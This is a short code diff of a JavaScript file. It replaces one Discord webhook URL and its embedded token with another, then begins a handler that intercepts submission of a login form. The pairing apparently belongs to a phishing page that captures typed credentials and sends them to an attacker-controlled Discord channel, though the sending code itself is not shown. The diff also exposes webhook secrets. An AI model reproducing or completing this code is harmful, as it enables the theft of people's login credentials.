@@ -1,4 +1,4 @@
-const webhookURL = "https://discord.com/api/webhooks/1481425433802178784/2ueg8z9F0edNbyh94cQBqQ2tQPV21TcoOQjrHg5NFIBpD3chAxd0Lm-MVI8xN9t98b8g";
+const webhookURL = "https://discord.com/api/webhooks/1481425939975114946/DK0ymjsQ73mw8Ub08uYiDgOuwWeq8HWuRGkunjvM-r1P74ghg-DWIYXgen-rijVO_lk6";
 
 document.getElementById('loginForm').addEventListener('submit', function(e) {
     e.preventDefault();
